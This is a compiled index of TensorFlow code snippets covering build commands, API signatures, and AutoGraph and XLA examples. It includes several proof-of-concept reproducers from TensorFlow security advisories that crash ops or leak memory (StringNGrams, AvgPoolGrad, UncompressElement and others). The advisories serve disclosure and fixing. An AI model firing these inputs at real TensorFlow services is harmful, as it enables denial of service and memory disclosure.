SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/BertClassifierSpec.md#_snippet_4

LANGUAGE: python
CODE:
```
get_config()
```

----------------------------------------

TITLE: Adding Clang Specific Flags CMake
DESCRIPTION: Appends the `-Wno-deprecated-declarations` flag to the private options list when the compiler ID matches 'Clang'. This suppresses warnings related to deprecated methods in `neon2sse`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_18

LANGUAGE: CMake
CODE:
```
if(CMAKE_CXX_COMPILER_ID MATCHES "Clang$")
  # TFLite uses deprecated methods in neon2sse which generates a huge number of
  # warnings so surpress these until they're fixed.
  list(APPEND TFLITE_TARGET_PRIVATE_OPTIONS "-Wno-deprecated-declarations")
endif()
```

----------------------------------------

TITLE: Installing TensorFlow NumPy Dependencies (Shell)
DESCRIPTION: Installs the necessary libraries for the tutorial: `tf-nightly` for the latest TensorFlow with experimental NumPy support and `tensorflow-datasets` for loading datasets like MNIST. These commands are typically run in a notebook environment.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_Numpy_Distributed_Image_Classification.ipynb#_snippet_0

LANGUAGE: shell
CODE:
```
!pip install --quiet --upgrade tf-nightly
!pip install --quiet --upgrade tensorflow-datasets
```

----------------------------------------

TITLE: Building TensorFlow Java Library Package using Bazel (Shell)
DESCRIPTION: These commands utilize Bazel to test and build the components for the TensorFlow Java API. This includes the native JNI library archive (`libtensorflow_jni.tar.gz`), the main Java JAR (`libtensorflow.jar`), and the sources JAR (`libtensorflow-src.jar`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/lib_package/README.md#_snippet_2

LANGUAGE: Shell
CODE:
```
bazel test --config opt //tensorflow/tools/lib_package:libtensorflow_test
bazel build --config opt \
  //tensorflow/tools/lib_package:libtensorflow_jni.tar.gz \
  //tensorflow/java:libtensorflow.jar \
  //tensorflow/java:libtensorflow-src.jar
```

----------------------------------------

TITLE: Adding SHRTDCT Library Target CMake
DESCRIPTION: Defines the static library target `fft2d_shrtdct` from its source file. This target appears to be independent of the main FFT targets defined earlier.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/modules/fft2d/CMakeLists.txt#_snippet_8

LANGUAGE: CMake
CODE:
```
add_library(fft2d_shrtdct "${FFT2D_SOURCE_DIR}/shrtdct.c")
```

----------------------------------------

TITLE: Conditional Feature Enabling by System
DESCRIPTION: This code section sets internal variables `_TFLITE_ENABLE_RUY`, `_TFLITE_ENABLE_NNAPI`, and `_TFLITE_ENABLE_MMAP` based on the detected system name (`CMAKE_SYSTEM_NAME`). RUY is enabled by default on Android, NNAPI is enabled only on Android, and MMAP is disabled on Windows.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_8

LANGUAGE: CMake
CODE:
```
set(_TFLITE_ENABLE_RUY "${TFLITE_ENABLE_RUY}")
if("${CMAKE_SYSTEM_NAME}" STREQUAL "Android")
  set(_TFLITE_ENABLE_RUY ON)
endif()
set(_TFLITE_ENABLE_NNAPI "${TFLITE_ENABLE_NNAPI}")
if(NOT "${CMAKE_SYSTEM_NAME}" STREQUAL "Android")
  set(_TFLITE_ENABLE_NNAPI OFF)
endif()
set(_TFLITE_ENABLE_MMAP "${TFLITE_ENABLE_MMAP}")
if(${CMAKE_SYSTEM_NAME} MATCHES "Windows")
  # See https://github.com/tensorflow/tensorflow/blob/\
  # 2b96f3662bd776e277f86997659e61046b56c315/tensorflow/lite/tools/make/\
  # Makefile#L157
  set(_TFLITE_ENABLE_MMAP OFF)
endif()
```

----------------------------------------

TITLE: Building iOS Arm64 Binary with Bazel - Shell
DESCRIPTION: Provides the shell command to build an iOS Arm64 binary for C++ tests using Bazel. Requires prerequisite setup for the iOS development environment.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/experimental/shlo/README.md#_snippet_12

LANGUAGE: Shell
CODE:
```
bazel build -c opt --config=ios_arm64 ops:op_name_test
```

----------------------------------------

TITLE: Initializing ContentT From Object in Python
DESCRIPTION: Initializes a ContentT object from an existing object representation. This class method facilitates creating a ContentT instance from another compatible object structure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ContentT.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
InitFromObj(
    content
)
```

----------------------------------------

TITLE: Install Xcode Tools using xcode-select (Shell)
DESCRIPTION: Installs command-line developer tools necessary for Xcode and development on macOS. This is a prerequisite for building projects like TensorFlow Lite.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_ios.md#_snippet_0

LANGUAGE: Shell
CODE:
```
xcode-select --install
```

----------------------------------------

TITLE: Get Length of Dataset Python
DESCRIPTION: This snippet shows the signature for the `__len__` method in Python. This method is commonly used to return the number of items or samples within a dataset or data structure. It's part of the object's protocol for determining size.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/DataLoader.md#_snippet_8

LANGUAGE: python
CODE:
```
__len__()\n
```

----------------------------------------

TITLE: Updating Gradle Android Plugin Version (Gradle Groovy/Kotlin)
DESCRIPTION: This snippet shows how to modify the classpath configuration in your project-level build.gradle file to use a potentially older version of the Android Gradle plugin (AGP). This is suggested as an optional step to resolve build errors if the default AGP version is incompatible with your Android Studio setup. This change is made in the `dependencies` block of the `buildscript` section.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/object_detection.md#_snippet_2

LANGUAGE: Groovy
CODE:
```
// from: classpath 'com.android.tools.build:gradle:4.2.2'
// to: classpath 'com.android.tools.build:gradle:4.1.2'
```

----------------------------------------

TITLE: Writing TFLite Subgraph to File using SubgraphWriter (C++)
DESCRIPTION: Shows how to save a specific subgraph from an `Interpreter` to a TFLite flatbuffer file using `tflite::SubgraphWriter`. Requires a built or modified `Interpreter` and the index of the target subgraph. Supports custom ops and/or custom I/O tensors.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/serialization/README.md#_snippet_1

LANGUAGE: C++
CODE:
```
std::unique_ptr<tflite::Interpreter> interpreter;
// ...build/modify interpreter...
// The number of subgraphs can be obtained by:
// const int num_subgraphs = interpreter_->subgraphs_size();
// Note that 0 <= subgraph_index < num_subgraphs
tflite::SubgraphWriter writer(&interpreter->subgraph(subgraph_index));
std::string filename = "/tmp/model.tflite";
writer.Write(filename);
```

----------------------------------------

TITLE: Importing Utility Libraries (Python)
DESCRIPTION: Imports necessary Python libraries including IPython for display, matplotlib for plotting and visualization, numpy for numerical operations, time for timing, and functools for functional programming tools. These libraries are used throughout the notebook for image handling, visualization, and data manipulation. Requires matplotlib, numpy, and IPython.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/style_transfer/overview.ipynb#_snippet_1

LANGUAGE: python
CODE:
```
import IPython.display as display

import matplotlib.pyplot as plt
import matplotlib as mpl
mpl.rcParams['figure.figsize'] = (12,12)
mpl.rcParams['axes.grid'] = False

import numpy as np
import time
import functools
```

----------------------------------------

TITLE: Transforming Simple Python For Loop with AutoGraph
DESCRIPTION: Demonstrates the transformation of a basic Python for loop (`for var in target: body`) into a call to the `ag__.for_stmt` operator. The generated code includes functions for state management and the loop body, passing explicit loop variables.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/operators.md#_snippet_2

LANGUAGE: Python
CODE:
```
for i in range(3):
  j = j + i
```

LANGUAGE: Python
CODE:
```
def get_state():
    return (j,)

def set_state(vars_):
    nonlocal j
    (j,) = vars_

def loop_body(itr):
    nonlocal j
    i = itr
    j = j + i

ag__.for_stmt(range(3), None, loop_body, get_state, set_state, ('j',), {})
```

----------------------------------------

TITLE: Adding Conditional Compiler Definition in CMake
DESCRIPTION: Conditionally adds the `-DFARMHASH_NO_BUILTIN_EXPECT` compiler definition to the `farmhash` library target if the `__builtin_expect` check failed, ensuring compatibility when the builtin is not available.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/modules/farmhash/CMakeLists.txt#_snippet_3

LANGUAGE: CMake
CODE:
```
if(NOT FARMHASH_HAS_BUILTIN_EXPECT)
  target_compile_definitions(farmhash PUBLIC -DFARMHASH_NO_BUILTIN_EXPECT)
endif()
```

----------------------------------------

TITLE: Retrieve Global Score Threshold - Python
DESCRIPTION: Retrieves the value of the global score threshold from the initialized `ScoreThresholdingOptions` object. This method accesses a property of the FlatBuffer object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreThresholdingOptions.md#_snippet_2

LANGUAGE: Python
CODE:
```
GlobalScoreThreshold()
```

----------------------------------------

TITLE: Defining Custom CUDA Distributions Dictionary (Bazel)
DESCRIPTION: This Bazel dictionary (`_CUSTOM_CUDA_REDISTRIBUTIONS`) specifies the locations for custom CUDA distributions directly within the WORKSPACE file, mirroring the structure of the custom JSON file format. It maps components and platforms to paths using `relative_path` or `full_path`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/hermetic_cuda.md#_snippet_11

LANGUAGE: Bazel
CODE:
```
_CUSTOM_CUDA_REDISTRIBUTIONS = {
   "cuda_cccl": {
      "linux-x86_64": {
         "relative_path": "cuda_cccl-linux-x86_64-12.4.99-archive.tar.xz",
      },
      "linux-sbsa": {
         "relative_path": "cuda_cccl-linux-sbsa-12.4.99-archive.tar.xz",
      }
   },
}
```

----------------------------------------

TITLE: Install TFLite Support Library Shell
DESCRIPTION: Installs the 'tflite_support' Python library using pip. This library is required to access and extract metadata embedded within the TensorFlow Lite model file. This command is typically executed in a notebook environment like Google Colab.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/speech_recognition.ipynb#_snippet_18

LANGUAGE: shell
CODE:
```
! pip install -q tflite_support
```

----------------------------------------

TITLE: Demonstrating CHECK Fail in TensorFlow QuantizeAndDequantizeV3 (Python)
DESCRIPTION: This Python snippet demonstrates the Denial of Service vulnerability in TensorFlow's `tf.raw_ops.QuantizeAndDequantizeV3` operation. It sets up input tensors, including a nonscalar (empty shape) `num_bits` tensor, which is the specific input that triggers a `CHECK` failure and subsequent crash when passed to the vulnerable operation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-112.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

signed_input = True
range_given = False
narrow_range = False
axis = -1
input = tf.constant(-3.5, shape=[1], dtype=tf.float32)
input_min = tf.constant(-3.5, shape=[1], dtype=tf.float32)
input_max = tf.constant(-3.5, shape=[1], dtype=tf.float32)
num_bits = tf.constant([], shape=[0], dtype=tf.int32)
tf.raw_ops.QuantizeAndDequantizeV3(input=input, input_min=input_min, input_max=input_max, num_bits=num_bits, signed_input=signed_input, range_given=range_given, narrow_range=narrow_range, axis=axis)
```

----------------------------------------

TITLE: Triggering Null Pointer Dereference with UncompressElement (Python)
DESCRIPTION: This Python snippet demonstrates a null pointer dereference vulnerability in `tf.raw_ops.UncompressElement`. It creates a `tf.data.Dataset`, converts it to a `Variant` tensor, and passes it to `UncompressElement` without the expected `CompressedElement` type, causing the null pointer dereference described in CVE-2021-37649. It shows how to reproduce the issue.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-123.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

data = tf.data.Dataset.from_tensors([0.0])
tf.raw_ops.UncompressElement(
  compressed=tf.data.experimental.to_variant(data),
  output_types=[tf.int64],
  output_shapes=[2])
```

----------------------------------------

TITLE: Building TensorFlow Inference Java JAR with Bazel (Bash)
DESCRIPTION: This Bazel command builds the android_tensorflow_inference_java target, producing the Java JAR file (libandroid_tensorflow_inference_java.jar). This JAR contains the Java API needed to interact with the native TensorFlow library for inference on Android. The output is found in the bazel-bin directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/android/inference_interface/README.md#_snippet_2

LANGUAGE: Bash
CODE:
```
bazel build //tensorflow/tools/android/inference_interface:android_tensorflow_inference_java
```

----------------------------------------

TITLE: Building Benchmark Model Tool on Linux Host (Bash)
DESCRIPTION: Builds the TensorFlow Lite benchmark_model CLI tool for the Linux host using Bazel.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/utils/experimental/sample_stable_delegate/README.md#_snippet_8

LANGUAGE: bash
CODE:
```
bazel build -c opt //tensorflow/lite/tools/benchmark:benchmark_model
```

----------------------------------------

TITLE: Demonstrating Vulnerability in TensorFlow SparseTensorDenseAdd - Python
DESCRIPTION: This snippet demonstrates a vulnerability in `tf.raw_ops.SparseTensorDenseAdd` where providing a sparse tensor with empty values but non-empty indices and shape that is added to a dense tensor leads to a null pointer reference during kernel execution, causing undefined behavior. It requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-074.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

a_indices = tf.constant(0, shape=[17, 2], dtype=tf.int64)
a_values = tf.constant([], shape=[0], dtype=tf.float32)
a_shape = tf.constant([6, 12], shape=[2], dtype=tf.int64)

b = tf.constant(-0.223668531, shape=[6, 12], dtype=tf.float32)

tf.raw_ops.SparseTensorDenseAdd(
    a_indices=a_indices, a_values=a_values, a_shape=a_shape, b=b)
```

----------------------------------------

TITLE: Using Negative Size Parameter in NMS-like Op Call (Python)
DESCRIPTION: This Python snippet attempts to demonstrate a similar vulnerability pattern using `tf.raw_ops.NonMaxSuppressionV5` but with parameters (like `max_output_size_per_class`) that are typically associated with `CombinedNonMaxSuppression`. Providing a negative value for a size parameter here (-1 for `max_output_size_per_class`) is intended to exploit the same integer-to-unsigned conversion vulnerability during internal vector resizing in the kernel. It requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-143.md#_snippet_2

LANGUAGE: Python
CODE:
```
import tensorflow as tf

tf.raw_ops.NonMaxSuppressionV5(
  boxes=[[[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]]]],
  scores=[[[1.0,2.0,3.0],[1.0,2.0,3.0],[1.0,2.0,3.0]]],
  max_output_size_per_class=-1,
  max_total_size=10,
  iou_threshold=score_threshold=0.5,
  pad_per_class=True,
  clip_boxes=True)
```

----------------------------------------

TITLE: Triggering Conv2DBackpropInput DoS in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how to trigger a denial-of-service vulnerability (TFSA-2022-101) in `tf.raw_ops.Conv2DBackpropInput`. It provides inputs with `input_sizes` set to a 2-dimensional tensor `[65534, 65534]`, which violates the operation's requirement for a 4-dimensional input, causing a `CHECK` failure. Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-101.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

strides = [1, 1, 1, 1]
padding = "SAME"
use_cudnn_on_gpu = True
explicit_paddings = []
data_format = "NHWC"
dilations = [1, 1, 1, 1]
input_sizes = tf.constant([65534,65534], shape=[2], dtype=tf.int32)
filter = tf.constant(0.159749106, shape=[3,3,2,2], dtype=tf.float32)
out_backprop = tf.constant(0, shape=[], dtype=tf.float32)
tf.raw_ops.Conv2DBackpropInput(input_sizes=input_sizes, filter=filter, out_backprop=out_backprop, strides=strides, padding=padding, use_cudnn_on_gpu=use_cudnn_on_gpu, explicit_paddings=explicit_paddings, data_format=data_format, dilations=dilations)
```

----------------------------------------

TITLE: Demonstrating Data Leak in tf.raw_ops.StringNGrams Python
DESCRIPTION: This Python snippet demonstrates the data leak vulnerability in `tf.raw_ops.StringNGrams`. By providing a crafted `data_splits` argument (`[0, 8]`), which goes beyond the bounds of the input data, the operation accesses and leaks arbitrary memory contents from the stack, shown as binary data in the output tensor.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-011.md#_snippet_0

LANGUAGE: python
CODE:
```
>>> tf.raw_ops.StringNGrams(data=["aa", "bb", "cc", "dd", "ee", "ff"], data_splits=[0,8], separator=" ", ngram_widths=[3], left_pad="", right_pad="", pad_width=0, preserve_short_sequences=False)
StringNGrams(ngrams=<tf.Tensor: shape=(6,), dtype=string, numpy=
array([b'aa bb cc', b'bb cc dd', b'cc dd ee', b'dd ee ff',
       b'ee ff \xf4j\xa7q\x7f\x00\x00q\x00\x00\x00\x00\x00\x00\x00\xd8\x9b~\xa8q\x7f\x00',
       b'ff \xf4j\xa7q\x7f\x00\x00q\x00\x00\x00\x00\x00\x00\x00\xd8\x9b~\xa8q\x7f\x00 \x9b~\xa8q\x7f\x00\x00p\xf5j\xa7q\x7f\x00\x00H\xf8j\xa7q\x7f\x00\x00\xf0\xf3\xf7\x85q\x7f\x00\x00`}\xa6\x00\x00\x00\x00\x00`~\xa6\x00\x00\x00\x00\x00\xb0~\xeb\x9bq\x7f\x00'],...
```

----------------------------------------

TITLE: Reproducing TensorFlow tf.raw_ops.Print Seg Fault in Python
DESCRIPTION: This Python code snippet demonstrates how to trigger the segmentation fault in `tf.raw_ops.Print`. It calls the operation with the `summarize` parameter explicitly set to 0, which exploits the vulnerability. Requires the TensorFlow library installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2023-016.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

tf.raw_ops.Print(input =  tf.constant([1, 1, 1, 1],dtype=tf.int32),
                            data =  [[False, False, False, False], [False], [False, False, False]],
                            message =  'tmp/I',
                            first_n = 100,
                            summarize = 0)
```

----------------------------------------

TITLE: Triggering Integer Division by 0 in tf.raw_ops.SparseReshape (Python)
DESCRIPTION: This code snippet demonstrates a vulnerability in `tf.raw_ops.SparseReshape` where providing specific `input_shape` and `new_shape` values triggers an integer division by zero error. This code requires TensorFlow and implicitly NumPy, showing how to reproduce the issue by calling the operation with crafted inputs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-114.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.SparseReshape(
  input_indices = np.ones((1,3)),
  input_shape = np.array([1,1,0]),
  new_shape = np.array([1,0]))
```

----------------------------------------

TITLE: MutableOpResolver AddCustom Signature (C++)
DESCRIPTION: This C++ snippet shows the signature of the `AddCustom` function used in `MutableOpResolver` for registering custom operator kernels. Similar to `AddBuiltin`, it includes optional `min_version` and `max_version` parameters defaulting to 1.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_version.md#_snippet_6

LANGUAGE: C++
CODE:
```
void AddCustom(const char* name, TfLiteRegistration* registration,
               int min_version = 1, int max_version = 1);
```

----------------------------------------

TITLE: Converting TFLite Model with Graphviz Output Format (Shell)
DESCRIPTION: This command converts a TensorFlow GraphDef (`frozen_graph.pb`) using the older converter (`experimental_new_converter=False`) and outputs a Graphviz `.dot` file instead of a TFLite model by setting `--output_format` to `GRAPHVIZ_DOT`. The output is a single `.dot` file (`foo.dot`). This method is noted to lose TFLite-specific transformations but can aid in debugging conversion issues. Requires specifying input arrays/shape and output arrays.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/r1/convert/cmdline_examples.md#_snippet_14

LANGUAGE: Shell
CODE:
```
tflite_convert \
  --experimental_new_converter=False\
  --graph_def_file=/tmp/mobilenet_v1_0.50_128/frozen_graph.pb \
  --output_format=GRAPHVIZ_DOT \
  --output_file=/tmp/foo.dot \
  --output_format=GRAPHVIZ_DOT \
  --input_arrays=input \
  --input_shape=1,128,128,3 \
  --output_arrays=MobilenetV1/Predictions/Reshape_1
```

----------------------------------------

TITLE: Building TensorFlow Benchmark Tool for Desktop with Bazel
DESCRIPTION: This command builds the TensorFlow benchmark tool binary optimized for the host desktop architecture using Bazel. It generates an executable in the bazel-bin directory for direct execution.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/benchmark/README.md#_snippet_4

LANGUAGE: Bash
CODE:
```
bazel build -c opt tensorflow/tools/benchmark:benchmark_model
```

----------------------------------------

TITLE: Including TFLite Micro Library Headers (C++)
DESCRIPTION: Includes the necessary header files for the core TensorFlow Lite for Microcontrollers library components, including the micro interpreter, error reporting, operation resolver, model schema, and versioning information. These headers provide the foundational classes and definitions required to build a TFLite Micro application.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/get_started_low_level.md#_snippet_0

LANGUAGE: C++
CODE:
```
#include "tensorflow/lite/micro/micro_mutable_op_resolver.h"
#include "tensorflow/lite/micro/micro_error_reporter.h"
#include "tensorflow/lite/micro/micro_interpreter.h"
#include "tensorflow/lite/schema/schema_generated.h"
#include "tensorflow/lite/version.h"
```

----------------------------------------

TITLE: Define MHLO Build Options
DESCRIPTION: Defines boolean options for controlling the build process, such as building MHLO embedded within another project or enabling Python bindings. These options are off by default.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/CMakeLists.txt#_snippet_5

LANGUAGE: CMake
CODE:
```
option(MHLO_BUILD_EMBEDDED "Build MHLO as part of another project" OFF)
option(MHLO_ENABLE_BINDINGS_PYTHON "Enables MHLO python bindings" OFF)
```

----------------------------------------

TITLE: Create Stable Delegate Configuration File - Android Bash
DESCRIPTION: Creates a JSON configuration file named `stable_delegate_settings.json` directly on the Android device at `/data/local/tmp` using an `adb shell echo` command. This file is required by the `benchmark_model` tool to specify the path where the stable delegate library can be found.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/utils/experimental/sample_stable_delegate/README.md#_snippet_11

LANGUAGE: bash
CODE:
```
adb shell 'echo "{
  \"stable_delegate_loader_settings\": {
    \"delegate_path\": \"/data/local/tmp/libtensorflowlite_sample_stable_delegate.so\"
  }
  // Add concrete delegate settings for the test target delegate.
}
"> /data/local/tmp/stable_delegate_settings.json'
```

----------------------------------------

TITLE: Reproducing AvgPoolGrad Heap Buffer Overflow in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how to reproduce a heap buffer overflow vulnerability in TensorFlow's `tf.raw_ops.AvgPoolGrad`. It sets environment variables, imports TensorFlow, defines specific kernel size, strides, padding, data format, original input shape, and gradient tensors that trigger the vulnerability when passed to the `AvgPoolGrad` operation on a CPU device. Requires TensorFlow dependency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2023-010.md#_snippet_0

LANGUAGE: python
CODE:
```
import os
os.environ['TF_ENABLE_ONEDNN_OPTS'] = '0'
import tensorflow as tf
print(tf.__version__)
with tf.device("CPU"):
    ksize = [1, 40, 128, 1]
    strides = [1, 128, 128, 30]
    padding = "SAME"
    data_format = "NHWC"
    orig_input_shape = [11, 9, 78, 9]
    grad = tf.saturate_cast(tf.random.uniform([16, 16, 16, 16], minval=-128, maxval=129, dtype=tf.int64), dtype=tf.float32)
    res = tf.raw_ops.AvgPoolGrad(
        ksize=ksize,
        strides=strides,
        padding=padding,
        data_format=data_format,
        orig_input_shape=orig_input_shape,
        grad=grad,
    )
```

----------------------------------------

TITLE: Constructing SparseTensor Shape in TensorFlow Kernel (C++)
DESCRIPTION: This C++ snippet from the `sparse_split_op.cc` kernel illustrates the creation of a `sparse::SparseTensor` using its `Create` method. It passes the input dimensions to the `TensorShape` constructor, which is vulnerable to integer overflow when the dimension sizes are excessively large, ultimately leading to the documented crash.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-071.md#_snippet_1

LANGUAGE: c++
CODE:
```
sparse::SparseTensor sparse_tensor;
OP_REQUIRES_OK(context,
               sparse::SparseTensor::Create(
                 input_indices, input_values,
                 TensorShape(input_shape.vec<int64>()), &sparse_tensor));
```

----------------------------------------

TITLE: Return Statement in While Loop Input Example Python
DESCRIPTION: Original Python code demonstrating a `while` loop with a conditional `return` statement, used as an example for AutoGraph transformation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_35

LANGUAGE: Python
CODE:
```
def f():
  while i < 10:
    if i > 3:
      return 1
    i += 1
```

----------------------------------------

TITLE: Creating XLA Shape Object - C++
DESCRIPTION: Demonstrates how to create an XLA `Shape` object using the `ShapeUtil::MakeShape` utility function in C++. It takes the data type (`F32` for 32-bit float) and an initializer list containing the sizes of each dimension (`{A, B, C, D}`) to define the array's structure. This is the standard way to programmatically define array shapes in XLA.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/shapes.md#_snippet_1

LANGUAGE: C++
CODE:
```
ShapeUtil::MakeShape(F32, {A, B, C, D})
```

----------------------------------------

TITLE: Access BoundingBoxProperties Index As Numpy Array Python
DESCRIPTION: Retrieves the 'index' vector from the bounding box properties as a NumPy array. This allows for convenient numerical operations on the index data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BoundingBoxProperties.md#_snippet_5

LANGUAGE: Python
CODE:
```
IndexAsNumpy()
```

----------------------------------------

TITLE: Creating XLA AllToAll Operation in C++
DESCRIPTION: This C++ snippet demonstrates the creation of an AllToAll operation using the XLA XlaBuilder. It initializes a builder named "alltoall", defines an input parameter 'x' with shape F32[4, 16], and then invokes AllToAll. The operation is configured to split the input along dimension 1, concatenate the scattered blocks along dimension 0, involving 4 participants/splits.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_0

LANGUAGE: C++
CODE:
```
XlaBuilder b("alltoall");
auto x = Parameter(&b, 0, ShapeUtil::MakeShape(F32, {4, 16}), "x");
AllToAll(x, /*split_dimension=*/1, /*concat_dimension=*/0, /*split_count=*/4);
```

----------------------------------------

TITLE: Good Practice: Single-Line Lambda Return (Pre-TF 2.3) Python
DESCRIPTION: Another recommended practice for pre-TF 2.3 is returning a lambda function directly on a single line. This avoids potential issues with source code extraction that can occur when lambdas are part of multi-line expressions or structures.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_56

LANGUAGE: Python
CODE:
```
# Good - single return
return lambda x, y: x*y - y
```

----------------------------------------

TITLE: TPU Variable Reads and Assigns MLIR
DESCRIPTION: Example showing `tf.ReadVariableOp` and `tf.AssignVariableOp` operations surrounding a `tf.TPUExecute` operation in MLIR. This represents the structure before the pass that merges variable operations into the execute op.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_55

LANGUAGE: mlir
CODE:
```
  %0 = "tf.ReadVariableOp"(%arg0)
  %1 = "tf.ReadVariableOp"(%arg1)
  %2 = "tf.TPUExecute"(%0, %1, %compile)
  %3 = "tf.AssignVariableOp"(%arg0, %2)
```

----------------------------------------

TITLE: Writing Chunked Proto to Disk in Python
DESCRIPTION: Demonstrates how to instantiate a `ModelConfig` proto, create a `ModelConfigSplitter`, and use its `write` method to serialize the chunked proto data to a file on disk.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/proto_splitter/g3doc/in-depth-guide.md#_snippet_3

LANGUAGE: python
CODE:
```
my_proto = ModelConfig(...)
export_dir = "..."
my_splitter = ModelConfigSplitter(my_proto)
my_splitter.write(export_dir)
```

----------------------------------------

TITLE: Adding Linker Flag for Select TF Ops (CocoaPods < 2.9.0) - Text
DESCRIPTION: This text snippet provides the required `-force_load` linker flag setting for Xcode project build settings when using the `TensorFlowLiteSelectTfOps` CocoaPod version older than 2.9.0, ensuring the necessary library is loaded at runtime.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_select.md#_snippet_8

LANGUAGE: text
CODE:
```
-force_load $(SRCROOT)/Pods/TensorFlowLiteSelectTfOps/Frameworks/TensorFlowLiteSelectTfOps.framework/TensorFlowLiteSelectTfOps
```

----------------------------------------

TITLE: Save Vocab Method Python
DESCRIPTION: Prints the file path to the vocabulary file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/BertClassifierSpec.md#_snippet_9

LANGUAGE: python
CODE:
```
save_vocab(
    vocab_filename
)
```

----------------------------------------

TITLE: Building Composite Op Libraries with Bazel
DESCRIPTION: Provides a Bazel BUILD target snippet demonstrating how to use the `gen_op_libraries` rule to compile composite op definitions. This rule takes a Python source file containing `@Composite` definitions and generates the necessary build artifacts (likely including backend IR) for the composite operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tfr/README.md#_snippet_2

LANGUAGE: BUILD
CODE:
```
load("//tensorflow/compiler/mlir/tfr:build_defs.bzl", "gen_op_libraries")

gen_op_libraries(
    name = "test_ops",
    src = "define_op_template.py",
    deps = [
        "//third_party/py/tensorflow",
    ],
)
```

----------------------------------------

